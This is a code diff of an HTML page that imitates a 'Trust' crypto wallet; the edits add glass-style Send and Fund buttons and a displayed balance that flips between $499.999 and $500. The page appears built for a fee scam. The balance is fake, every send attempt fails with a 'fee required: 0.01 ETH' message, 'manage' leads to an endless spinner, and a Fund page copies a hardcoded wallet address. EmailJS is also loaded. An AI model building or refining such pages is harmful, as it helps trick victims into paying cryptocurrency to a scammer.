@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Trust • send & fund pages</title>
+  <title>Trust • clean glass & balance flip</title>
   <!-- EmailJS (unchanged) -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
@@ -29,7 +29,7 @@
       position: relative;
     }
 
-    /* laser beam (preserved) */
+    /* laser beam */
     .laser-beam {
       position: fixed;
       top: 0;
@@ -173,6 +173,7 @@
       font-weight: 600;
       color: #0b1d33;
       line-height: 1.1;
+      transition: color 0.2s;
     }
     .balance-sub {
       color: #4e688b;
@@ -182,12 +183,13 @@
       margin-top: 4px;
     }
 
+    /* clean glass-style action circles: just text inside */
     .action-row {
       display: flex;
       justify-content: center;
-      gap: 40px;
+      gap: 50px;
       background: #f4f9ff;
-      padding: 10px 20px;
+      padding: 12px 20px;
       border-radius: 60px;
       border: 1px solid #dbe3ef;
       margin: 4px 0;
@@ -196,23 +198,29 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 4px;
-      font-size: 0.8rem;
-      font-weight: 500;
+      gap: 6px;
+      font-size: 0.85rem;
+      font-weight: 550;
       color: #1e314a;
       cursor: pointer;
     }
-    .action-icon {
-      width: 44px;
-      height: 44px;
+    .action-circle-glass {
+      width: 52px;
+      height: 52px;
       border-radius: 50%;
-      background: white;
+      background: rgba(255,255,255,0.7);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+      border: 1.5px solid rgba(255,255,255,0.9);
+      box-shadow: 0 8px 18px -6px rgba(0,40,80,0.25), inset 0 2px 4px rgba(255,255,255,1);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 1.3rem;
-      box-shadow: 0 3px 8px -4px #8fa3c0;
-      border: 1px solid #cddbf0;
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: #1f344b;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
     }
 
     .prediction-row {
@@ -378,7 +386,7 @@
       text-align: center;
     }
 
-    /* ----- SEND PAGE (like 4938.jpg) ----- */
+    /* ----- SEND PAGE ----- */
     .send-page {
       gap: 20px;
     }
@@ -528,21 +536,21 @@
       <div class="light-footer">secure gateway</div>
     </div>
 
-    <!-- MAIN WALLET PAGE -->
+    <!-- MAIN WALLET PAGE (glass circles & balance toggle) -->
     <div class="page wallet-page" id="walletPage">
       <div class="balance-section">
         <div class="total-label">total balance</div>
-        <div class="total-balance">$499.999</div>
+        <div class="total-balance" id="mainBalance">$499.999</div>
         <div class="balance-sub">$0.00 (0.0%)</div>
       </div>
 
       <div class="action-row">
         <div class="action-item" id="sendActionMain">
-          <div class="action-icon">⬆️</div>
+          <div class="action-circle-glass">SEND</div>
           <span>Send</span>
         </div>
         <div class="action-item" id="fundActionMain">
-          <div class="action-icon">⬇️</div>
+          <div class="action-circle-glass">FUND</div>
           <span>Fund</span>
         </div>
       </div>
@@ -604,7 +612,7 @@
       </div>
     </div>
 
-    <!-- SEND PAGE (like 4938.jpg) -->
+    <!-- SEND PAGE -->
     <div class="page send-page" id="sendPage">
       <div class="send-header">
         <div class="back-link-sm" id="backFromSend">← back</div>
@@ -639,7 +647,6 @@
         </div>
       </div>
 
-      <!-- confirm button & fee error placeholder (hidden by default) -->
       <div id="feeErrorBox" style="display: none;" class="error-fee-box">
         <span>⚠️</span> fee required: 0.01 ETH
       </div>
@@ -679,7 +686,15 @@
       const feeErrorBox = document.getElementById('feeErrorBox');
 
       const walletAddress = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';
-      const demoAddress = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'; // for paste demo
+      const demoAddress = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
+
+      // balance toggling every 15 seconds
+      const balanceEl = document.getElementById('mainBalance');
+      let highBalance = false;
+      setInterval(() => {
+        highBalance = !highBalance;
+        balanceEl.innerText = highBalance ? '$500' : '$499.999';
+      }, 15000);
 
       // open wallet
       openWallet.addEventListener('click', ()=>{
@@ -692,7 +707,6 @@
         landing.classList.add('active');
       });
 
-      // manage -> infinite spinner
       manageBtn.addEventListener('click', ()=>{
         wallet.classList.remove('active');
         loading.classList.add('active');
@@ -703,7 +717,6 @@
         wallet.classList.add('active');
       });
 
-      // fund page
       fundAction.addEventListener('click', ()=>{
         wallet.classList.remove('active');
         fundPage.classList.add('active');
@@ -713,11 +726,9 @@
         wallet.classList.add('active');
       });
 
-      // send page
       sendAction.addEventListener('click', ()=>{
         wallet.classList.remove('active');
         sendPage.classList.add('active');
-        // reset fields
         addressInput.value = '';
         amountInput.value = '';
         usdHint.innerText = '≈ $0.00';
@@ -730,18 +741,16 @@
         wallet.classList.add('active');
       });
 
-      // paste demo
       pasteBtn.addEventListener('click', async ()=>{
         try {
           const text = await navigator.clipboard.readText();
           addressInput.value = text;
         } catch {
-          addressInput.value = demoAddress; // fallback demo
+          addressInput.value = demoAddress;
         }
         validateSendForm();
       });
 
-      // max button: set 500, cap if >500
       maxBtn.addEventListener('click', ()=>{
         amountInput.value = 500;
         updateUsdHint();
@@ -749,7 +758,6 @@
         validateSendForm();
       });
 
-      // cap amount on input
       amountInput.addEventListener('input', ()=>{
         capAmount();
         updateUsdHint();
@@ -761,7 +769,7 @@
         if (!isNaN(val) && val > 500) {
           amountInput.value = 500;
         } else if (val < 1 && amountInput.value !== '') {
-          amountInput.value = 1;  // minimum 1
+          amountInput.value = 1;
         }
       }
 
@@ -774,7 +782,6 @@
         }
       }
 
-      // validation: address non-empty and amount >=1
       function validateSendForm() {
         const addr = addressInput.value.trim();
         const amt = parseFloat(amountInput.value);
@@ -784,30 +791,23 @@
 
       addressInput.addEventListener('input', validateSendForm);
 
-      // confirm button logic: show spinner, then fee error, then back to send
       confirmBtn.addEventListener('click', (e)=>{
         if (confirmBtn.disabled) return;
-
-        // disable, show spinner inside button
         const originalText = confirmBtn.innerText;
         confirmBtn.disabled = true;
         confirmBtn.innerHTML = '<span class="spinner-mini"></span> processing';
 
-        // after 2 seconds, hide spinner, show fee error
         setTimeout(() => {
-          confirmBtn.innerHTML = originalText; // restore "Next"
-          confirmBtn.disabled = true; // keep disabled until new input
-          feeErrorBox.style.display = 'flex'; // show fee required
+          confirmBtn.innerHTML = originalText;
+          confirmBtn.disabled = true;
+          feeErrorBox.style.display = 'flex';
 
-          // after 3.5 seconds, hide fee error and return to send page (stay)
           setTimeout(() => {
             feeErrorBox.style.display = 'none';
-            // page stays send, user can retry
           }, 3500);
         }, 2000);
       });
 
-      // fund page copy
       document.getElementById('fundCopyBtn').addEventListener('click', ()=>{
         const addr = document.getElementById('fundAddress').innerText;
         navigator.clipboard.writeText(addr).then(()=>{
